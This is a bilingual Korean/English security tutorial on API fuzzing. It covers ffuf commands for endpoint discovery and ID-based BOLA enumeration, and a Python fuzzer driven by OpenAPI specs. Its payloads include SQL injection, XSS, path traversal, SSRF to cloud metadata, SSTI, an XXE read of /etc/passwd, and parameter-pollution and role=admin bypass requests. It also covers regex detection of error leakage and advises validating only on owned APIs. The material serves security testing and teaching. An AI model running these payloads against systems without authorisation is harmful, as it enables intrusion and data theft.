> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# API 퍼징 — ffuf·OpenAPI 기반 자동 취약점 탐지

## 0. 초보자를 위한 개념 이해

### 퍼징(Fuzzing)이란?

**퍼징**은 예상치 못한 무작위 또는 반구조화된 입력을 자동으로 전송해서 프로그램의 취약점을 찾는 기법입니다.

```
일반적인 테스트:
  개발자: "이름 필드에 '홍길동'을 입력하고 저장 버튼 클릭"
  예상 결과: 성공적으로 저장됨

퍼징:
  도구: "이름 필드에 다음을 자동으로 시도"
  - 빈 문자열 ""
  - 매우 긴 문자열 "AAAA...AAAA" (10,000자)
  - SQL 인젝션 "' OR '1'='1"
  - XSS "<script>alert(1)</script>"
  - 특수 문자 "../../etc/passwd"
  - Null 바이트 "\x00"
  → 비정상적인 응답(500 에러, 타임아웃)을 발견하면 취약점 가능성
```

**비유:** 자물쇠 테스트
- 일반 테스트 = 정해진 열쇠로 문 열기
- 퍼징 = 수천 개의 다른 열쇠를 빠르게 넣어보기

### API 퍼징이 중요한 이유

```
API는 자동화된 퍼징에 취약한 이유:
  1. 구조화된 입력 (JSON) → 퍼징 자동화 쉬움
  2. OpenAPI 명세(swagger.json) → 모든 파라미터 자동 파악
  3. 속도 제한 없으면 → 빠르게 많은 케이스 테스트

실제 발견되는 취약점:
  - BOLA: /api/orders/123 → /api/orders/456 (다른 사람 데이터)
  - 인젝션: {"name": "' OR 1=1--"} → SQL 실행
  - SSRF: {"url": "http://169.254.169.254/..."} → AWS 자격증명 탈취
  - 노출된 엔드포인트: /api/v1/admin/users (미인가 접근 가능)
```

### 주요 퍼징 도구

| 도구 | 특징 | 사용 예시 |
|------|------|-----------|
| **ffuf** | 빠른 웹 퍼저, CLI | 경로/파라미터 브루트포스 |
| **Burp Suite** | GUI + 자동화, 가장 인기 | 모든 API 테스트 |
| **OWASP ZAP** | 무료 오픈소스 | OWASP 룰 기반 자동 스캔 |
| **Postman** | API 개발자 도구 | 수동 + 자동화 테스트 |
| **RESTler** | MS의 스마트 REST API 퍼저 | OpenAPI 기반 자동 퍼징 |
| **Schemathesis** | OpenAPI 기반 속성 테스트 | CI/CD 통합 |

---

## 1. API 퍼징 개요

API 퍼징은 예상치 못한 입력을 자동으로 전송해 오류·예외·취약점을 탐지하는 기법이다.

| 퍼징 대상 | 탐지 취약점 |
|-----------|-------------|
| 경로 파라미터 | BOLA·경로 순회 |
| 쿼리 파라미터 | SQLi·XSS·SSRF |
| 요청 바디 | 인젝션·Mass Assignment |
| 헤더 | 헤더 인젝션·인증 우회 |
| HTTP 메서드 | 미인가 메서드 노출 |

---

## 2. ffuf로 API 엔드포인트 발견

### 2.1 경로 퍼징

```bash
# API 경로 발견
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://api.target.com/FUZZ \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,301,302,403 \
  -o endpoints.json -of json

# 버전별 경로 퍼징
ffuf -w versions.txt:VER -w paths.txt:PATH \
  -u https://api.target.com/VER/PATH \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,403

# 숨겨진 파라미터 퍼징 (arjun 스타일)
ffuf -w params.txt \
  -u "https://api.target.com/v1/users?FUZZ=1" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -fs 0
```

### 2.2 ID 기반 BOLA 퍼징

```bash
# BOLA — 숫자 ID 퍼징
seq 1 10000 | ffuf -w - \
  -u "https://api.target.com/v1/users/FUZZ/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -t 50

# UUID 퍼징 (미리 생성된 리스트 사용)
ffuf -w uuid_list.txt \
  -u "https://api.target.com/v1/documents/FUZZ" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,403
```

---

## 3. OpenAPI 기반 자동 퍼저

```python
#!/usr/bin/env python3
"""OpenAPI/Swagger 명세 기반 API 자동 퍼저."""

import argparse
import json
import random
import string
from pathlib import Path
from typing import Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx
import yaml


def load_spec(path_or_url: str) -> dict:
    if path_or_url.startswith("http"):
        with httpx.Client(verify=False) as client:
            resp = client.get(path_or_url, timeout=15)
            content = resp.text
    else:
        content = Path(path_or_url).read_text()

    if path_or_url.endswith(".yaml") or path_or_url.endswith(".yml"):
        return yaml.safe_load(content)
    return json.loads(content)


def generate_fuzz_values(schema: dict) -> list[Any]:
    """스키마 타입에 맞는 퍼징 값 생성."""
    type_ = schema.get("type", "string")
    values: list[Any] = []

    match type_:
        case "string":
            values = [
                "",
                "a" * 10000,  # 버퍼 오버플로우
                "' OR '1'='1",  # SQLi
                "<script>alert(1)</script>",  # XSS
                "../../etc/passwd",  # 경로 순회
                "http://169.254.169.254/",  # SSRF (AWS 메타데이터)
                "%00",  # Null byte
                "${7*7}",  # SSTI
                "{{7*7}}",  # Jinja SSTI
            ]
        case "integer" | "number":
            values = [0, -1, 2**31 - 1, 2**63 - 1, -2**63, 99999999999]
        case "boolean":
            values = [True, False, "true", "false", 1, 0]

    return values


def extract_endpoints(spec: dict) -> list[dict]:
    """OpenAPI 명세에서 엔드포인트 추출."""
    endpoints = []
    base_url = ""

    if "servers" in spec:
        base_url = spec["servers"][0].get("url", "")

    for path, path_item in spec.get("paths", {}).items():
        for method, operation in path_item.items():
            if method not in ("get", "post", "put", "delete", "patch"):
                continue
            endpoints.append({
                "method": method.upper(),
                "path": path,
                "operation": operation,
                "base_url": base_url,
            })

    return endpoints


def fuzz_endpoint(
    endpoint: dict,
    token: str | None,
    base_url_override: str | None = None,
) -> list[dict]:
    results = []
    base = base_url_override or endpoint["base_url"]
    path = endpoint["path"]
    method = endpoint["method"]
    operation = endpoint["operation"]

    headers: dict[str, str] = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    params_spec = operation.get("parameters", [])
    body_spec = operation.get("requestBody", {})

    body_schema = (
        body_spec.get("content", {})
        .get("application/json", {})
        .get("schema", {})
    )

    fuzz_values = ["' OR '1'='1", "<script>", "../../etc/passwd", "a" * 5000, ""]

    with httpx.Client(verify=False) as client:
        # 경로 파라미터 퍼징
        path_params = [p for p in params_spec if p.get("in") == "path"]
        for param in path_params:
            for val in fuzz_values:
                test_path = path.replace(f"{{{param['name']}}}", str(val))
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{test_path}", headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "path_param_error",
                            "path": test_path,
                            "param": param["name"],
                            "value": val,
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

        # 바디 퍼징
        if body_schema and method in ("POST", "PUT", "PATCH"):
            for val in fuzz_values:
                test_body = {
                    k: val for k in body_schema.get("properties", {}).keys()
                }
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{path}", json=test_body, headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "body_error",
                            "path": path,
                            "value": str(val)[:50],
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="OpenAPI 기반 API 퍼저")
    parser.add_argument("spec", help="OpenAPI 명세 경로 또는 URL")
    parser.add_argument("-t", "--token", help="인증 토큰")
    parser.add_argument("-b", "--base-url", help="베이스 URL 오버라이드")
    parser.add_argument("-w", "--workers", type=int, default=10, help="병렬 워커 수")
    parser.add_argument("-o", "--output", type=Path, help="결과 저장 경로")
    args = parser.parse_args()

    print(f"[*] 명세 로딩: {args.spec}")
    spec = load_spec(args.spec)
    endpoints = extract_endpoints(spec)
    print(f"[*] 엔드포인트 {len(endpoints)}개 발견")

    all_results: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(fuzz_endpoint, ep, args.token, args.base_url): ep
            for ep in endpoints
        }
        for future in as_completed(futures):
            ep = futures[future]
            results = future.result()
            if results:
                print(f"[!] {ep['method']} {ep['path']}: {len(results)}개 이슈")
                all_results.extend(results)

    print(f"\n총 {len(all_results)}개 이슈 발견")
    if args.output:
        args.output.write_text(json.dumps(all_results, indent=2, ensure_ascii=False))
        print(f"결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. 파라미터 오염 (HPP)

```bash
# HTTP Parameter Pollution
# 동일 파라미터 중복 전송
curl -s "https://api.target.com/v1/transfer?to=attacker&to=victim&amount=100" \
  -H "Authorization: Bearer $TOKEN"

# POST 바디와 쿼리 스트링 충돌
curl -s -X POST "https://api.target.com/v1/transfer?role=user" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","amount":1000}'
```

---

## 5. 콘텐츠 타입 혼동

```bash
# JSON → XML 콘텐츠 타입 혼동
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>'

# multipart/form-data로 JSON 파라미터 우회
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -F 'data={"role":"admin","name":"test"};type=application/json'
```

---

## 6. 응답 분석 패턴

```python
#!/usr/bin/env python3
"""API 응답 이상 탐지 — 오류 패턴 분석."""

import re
from dataclasses import dataclass

ERROR_PATTERNS = {
    "sql_error": re.compile(
        r"SQL syntax|mysql_fetch|ORA-\d+|sqlite3\.|PostgreSQL.*ERROR",
        re.IGNORECASE,
    ),
    "stack_trace": re.compile(
        r"at \w+\.\w+\(|Traceback \(most recent|Exception in thread",
        re.IGNORECASE,
    ),
    "path_disclosure": re.compile(
        r"[A-Z]:\\|/var/www/|/home/\w+/|/usr/local/",
    ),
    "internal_ip": re.compile(
        r"192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
    ),
}


@dataclass
class ResponseIssue:
    issue_type: str
    match: str
    endpoint: str
    status_code: int


def analyze_response(
    endpoint: str, status_code: int, body: str
) -> list[ResponseIssue]:
    issues: list[ResponseIssue] = []
    for issue_type, pattern in ERROR_PATTERNS.items():
        m = pattern.search(body)
        if m:
            issues.append(ResponseIssue(issue_type, m.group(0)[:100], endpoint, status_code))
    return issues
```

---

## 7. 주요 API 퍼징 도구

| 도구 | 특징 |
|------|------|
| `ffuf` | 고속 웹 퍼저, API 경로 발견 |
| `wfuzz` | 복잡한 퍼징 시나리오 |
| `arjun` | 숨겨진 HTTP 파라미터 발견 |
| `kiterunner` | OpenAPI 기반 경로 발견 |
| `nuclei` | API 취약점 템플릿 스캔 |
| `Burp Intruder` | GUI 기반 정밀 퍼징 |
| `RESTler` | AI 기반 REST API 퍼저 (Microsoft) |

---

<!-- detect-validate-52 -->
## API 퍼징 발견 검증과 오탐 관리

API 퍼징(ffuf·OpenAPI 퍼저·HPP·콘텐츠 타입 혼동)은 *대량 요청으로 엔드포인트·파라미터 취약을 탐지*한다. 퍼저 결과는 상태코드 기반 오탐이 많으므로 분석자는 **발견을 수동 재현하고 영향을 검증**해야 한다. 검증은 **소유 API**에서만.

### 검증 항목 → 확인 질문 → 측정 신호 → 함정

| 검증 항목 | 확인 질문 | 측정 신호 | 함정 |
|---|---|---|---|
| 엔드포인트 발견 | 실제 존재? | 수동 200 재현 | 와일드카드 200 |
| 파라미터 취약 | 영향 있나? | 데이터/권한 변화 | 에러코드만 |
| HPP | 파싱 차이? | 중복 파라미터 우회 | 무영향 차이 |
| 응답 분석 | 의미 있는 차? | 길이/내용 유의 | 시간 노이즈 |

### 발견 검증 (직접 확인)

```bash
# 1) 퍼저가 찾은 엔드포인트를 수동 재현(오탐 제거) — 와일드카드 200 함정 회피 위해 무작위 경로와 비교
curl -s -o /dev/null -w "found: %{http_code}\n" https://api.internal/v1/admin/config; curl -s -o /dev/null -w "random: %{http_code}\n" https://api.internal/v1/zzz$RANDOM
# 2) HPP 파라미터 오염 영향 검증 — 중복 파라미터로 인가 우회되면 실제 취약 신호
curl -s -o /dev/null -w "hpp -> %{http_code}\n" "https://api.internal/v1/orders?user=$USER_A&user=$USER_B" -H "Authorization: Bearer $TOKEN_A"
```

> API 퍼징은 *발견이 재현·영향 있는가*다 — "퍼저가 200을 냈다"와 "그 엔드포인트가 수동 재현되고 데이터/권한에 영향을 준다"는 다르다. 소유 API에서 직접 검증한다([[12_Bug_Bounty]], [[73_Bug_Bounty_Automation]], [[05_Web_Hacking]]).

---

<a name="english"></a>

# API Fuzzing — Automated Vulnerability Detection with ffuf and OpenAPI

## 1. API Fuzzing Overview

API fuzzing is a technique that automatically sends unexpected inputs to detect errors, exceptions, and vulnerabilities.

| Fuzzing Target | Detected Vulnerabilities |
|----------------|--------------------------|
| Path parameters | BOLA, path traversal |
| Query parameters | SQLi, XSS, SSRF |
| Request body | Injection, Mass Assignment |
| Headers | Header injection, authentication bypass |
| HTTP methods | Exposure of unauthorized methods |

---

## 2. API Endpoint Discovery with ffuf

### 2.1 Path Fuzzing

```bash
# API path discovery
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u https://api.target.com/FUZZ \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,301,302,403 \
  -o endpoints.json -of json

# Version-based path fuzzing
ffuf -w versions.txt:VER -w paths.txt:PATH \
  -u https://api.target.com/VER/PATH \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,201,403

# Hidden parameter fuzzing (arjun style)
ffuf -w params.txt \
  -u "https://api.target.com/v1/users?FUZZ=1" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -fs 0
```

### 2.2 ID-Based BOLA Fuzzing

```bash
# BOLA — numeric ID fuzzing
seq 1 10000 | ffuf -w - \
  -u "https://api.target.com/v1/users/FUZZ/profile" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200 -t 50

# UUID fuzzing (using pre-generated list)
ffuf -w uuid_list.txt \
  -u "https://api.target.com/v1/documents/FUZZ" \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,403
```

---

## 3. OpenAPI-Based Automated Fuzzer

```python
#!/usr/bin/env python3
"""Automated API fuzzer based on OpenAPI/Swagger specifications."""

import argparse
import json
import random
import string
from pathlib import Path
from typing import Any
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx
import yaml


def load_spec(path_or_url: str) -> dict:
    if path_or_url.startswith("http"):
        with httpx.Client(verify=False) as client:
            resp = client.get(path_or_url, timeout=15)
            content = resp.text
    else:
        content = Path(path_or_url).read_text()

    if path_or_url.endswith(".yaml") or path_or_url.endswith(".yml"):
        return yaml.safe_load(content)
    return json.loads(content)


def generate_fuzz_values(schema: dict) -> list[Any]:
    """Generate fuzzing values matching the schema type."""
    type_ = schema.get("type", "string")
    values: list[Any] = []

    match type_:
        case "string":
            values = [
                "",
                "a" * 10000,  # Buffer overflow
                "' OR '1'='1",  # SQLi
                "<script>alert(1)</script>",  # XSS
                "../../etc/passwd",  # Path traversal
                "http://169.254.169.254/",  # SSRF (AWS metadata)
                "%00",  # Null byte
                "${7*7}",  # SSTI
                "{{7*7}}",  # Jinja SSTI
            ]
        case "integer" | "number":
            values = [0, -1, 2**31 - 1, 2**63 - 1, -2**63, 99999999999]
        case "boolean":
            values = [True, False, "true", "false", 1, 0]

    return values


def extract_endpoints(spec: dict) -> list[dict]:
    """Extract endpoints from OpenAPI specification."""
    endpoints = []
    base_url = ""

    if "servers" in spec:
        base_url = spec["servers"][0].get("url", "")

    for path, path_item in spec.get("paths", {}).items():
        for method, operation in path_item.items():
            if method not in ("get", "post", "put", "delete", "patch"):
                continue
            endpoints.append({
                "method": method.upper(),
                "path": path,
                "operation": operation,
                "base_url": base_url,
            })

    return endpoints


def fuzz_endpoint(
    endpoint: dict,
    token: str | None,
    base_url_override: str | None = None,
) -> list[dict]:
    results = []
    base = base_url_override or endpoint["base_url"]
    path = endpoint["path"]
    method = endpoint["method"]
    operation = endpoint["operation"]

    headers: dict[str, str] = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    params_spec = operation.get("parameters", [])
    body_spec = operation.get("requestBody", {})

    body_schema = (
        body_spec.get("content", {})
        .get("application/json", {})
        .get("schema", {})
    )

    fuzz_values = ["' OR '1'='1", "<script>", "../../etc/passwd", "a" * 5000, ""]

    with httpx.Client(verify=False) as client:
        # Path parameter fuzzing
        path_params = [p for p in params_spec if p.get("in") == "path"]
        for param in path_params:
            for val in fuzz_values:
                test_path = path.replace(f"{{{param['name']}}}", str(val))
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{test_path}", headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "path_param_error",
                            "path": test_path,
                            "param": param["name"],
                            "value": val,
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

        # Body fuzzing
        if body_schema and method in ("POST", "PUT", "PATCH"):
            for val in fuzz_values:
                test_body = {
                    k: val for k in body_schema.get("properties", {}).keys()
                }
                try:
                    resp = getattr(client, method.lower())(
                        f"{base}{path}", json=test_body, headers=headers, timeout=10
                    )
                    if resp.status_code == 500:
                        results.append({
                            "type": "body_error",
                            "path": path,
                            "value": str(val)[:50],
                            "status": resp.status_code,
                        })
                except httpx.RequestError:
                    pass

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="OpenAPI-based API fuzzer")
    parser.add_argument("spec", help="OpenAPI specification path or URL")
    parser.add_argument("-t", "--token", help="Authentication token")
    parser.add_argument("-b", "--base-url", help="Base URL override")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Parallel worker count")
    parser.add_argument("-o", "--output", type=Path, help="Result save path")
    args = parser.parse_args()

    print(f"[*] Loading specification: {args.spec}")
    spec = load_spec(args.spec)
    endpoints = extract_endpoints(spec)
    print(f"[*] Found {len(endpoints)} endpoints")

    all_results: list[dict] = []
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        futures = {
            executor.submit(fuzz_endpoint, ep, args.token, args.base_url): ep
            for ep in endpoints
        }
        for future in as_completed(futures):
            ep = futures[future]
            results = future.result()
            if results:
                print(f"[!] {ep['method']} {ep['path']}: {len(results)} issues")
                all_results.extend(results)

    print(f"\nTotal {len(all_results)} issues found")
    if args.output:
        args.output.write_text(json.dumps(all_results, indent=2, ensure_ascii=False))
        print(f"Results saved: {args.output}")


if __name__ == "__main__":
    main()
```

---

## 4. HTTP Parameter Pollution (HPP)

```bash
# HTTP Parameter Pollution
# Sending duplicate parameters
curl -s "https://api.target.com/v1/transfer?to=attacker&to=victim&amount=100" \
  -H "Authorization: Bearer $TOKEN"

# POST body vs query string collision
curl -s -X POST "https://api.target.com/v1/transfer?role=user" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","amount":1000}'
```

---

## 5. Content Type Confusion

```bash
# JSON → XML content type confusion
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>'

# Bypass JSON parameters via multipart/form-data
curl -s -X POST https://api.target.com/v1/users \
  -H "Authorization: Bearer $TOKEN" \
  -F 'data={"role":"admin","name":"test"};type=application/json'
```

---

## 6. Response Analysis Patterns

```python
#!/usr/bin/env python3
"""API response anomaly detection — error pattern analysis."""

import re
from dataclasses import dataclass

ERROR_PATTERNS = {
    "sql_error": re.compile(
        r"SQL syntax|mysql_fetch|ORA-\d+|sqlite3\.|PostgreSQL.*ERROR",
        re.IGNORECASE,
    ),
    "stack_trace": re.compile(
        r"at \w+\.\w+\(|Traceback \(most recent|Exception in thread",
        re.IGNORECASE,
    ),
    "path_disclosure": re.compile(
        r"[A-Z]:\\|/var/www/|/home/\w+/|/usr/local/",
    ),
    "internal_ip": re.compile(
        r"192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+",
    ),
}


@dataclass
class ResponseIssue:
    issue_type: str
    match: str
    endpoint: str
    status_code: int


def analyze_response(
    endpoint: str, status_code: int, body: str
) -> list[ResponseIssue]:
    issues: list[ResponseIssue] = []
    for issue_type, pattern in ERROR_PATTERNS.items():
        m = pattern.search(body)
        if m:
            issues.append(ResponseIssue(issue_type, m.group(0)[:100], endpoint, status_code))
    return issues
```

---

## 7. Key API Fuzzing Tools

| Tool | Features |
|------|----------|
| `ffuf` | High-speed web fuzzer, API path discovery |
| `wfuzz` | Complex fuzzing scenarios |
| `arjun` | Hidden HTTP parameter discovery |
| `kiterunner` | OpenAPI-based path discovery |
| `nuclei` | API vulnerability template scanning |
| `Burp Intruder` | GUI-based precision fuzzing |
| `RESTler` | AI-based REST API fuzzer (Microsoft) |

<!-- detect-validate-52 -->
## API-Fuzzing Finding Validation and False-Positive Management

API fuzzing (ffuf, OpenAPI fuzzer, HPP, content-type confusion) *detects endpoint/parameter flaws via bulk requests*. Fuzzer results are status-code-noisy, so the analyst must **manually reproduce findings and validate impact**. Validate only on **owned APIs**.

### Validation item -> Question -> Measured signal -> Pitfall

| Validation item | Question | Measured signal | Pitfall |
|---|---|---|---|
| Endpoint discovery | Really exists? | Manual 200 reproduced | Wildcard 200 |
| Parameter flaw | Any impact? | Data/authority change | Error code only |
| HPP | Parsing difference? | Duplicate-param bypass | No-impact difference |
| Response analysis | Meaningful diff? | Length/content significant | Timing noise |

### Finding validation (verify directly)

```bash
# 1) Manually reproduce a fuzzer-found endpoint (remove FPs) — compare against a random path to avoid the wildcard-200 trap
curl -s -o /dev/null -w "found: %{http_code}\n" https://api.internal/v1/admin/config; curl -s -o /dev/null -w "random: %{http_code}\n" https://api.internal/v1/zzz$RANDOM
# 2) Validate HPP impact — if duplicate parameters bypass authorization, it is a real vuln signal
curl -s -o /dev/null -w "hpp -> %{http_code}\n" "https://api.internal/v1/orders?user=$USER_A&user=$USER_B" -H "Authorization: Bearer $TOKEN_A"
```

> API fuzzing is *whether findings reproduce and have impact* -- "the fuzzer returned 200" differs from "that endpoint reproduces manually and affects data/authority". Validate on owned APIs directly ([[12_Bug_Bounty]], [[73_Bug_Bounty_Automation]], [[05_Web_Hacking]]).
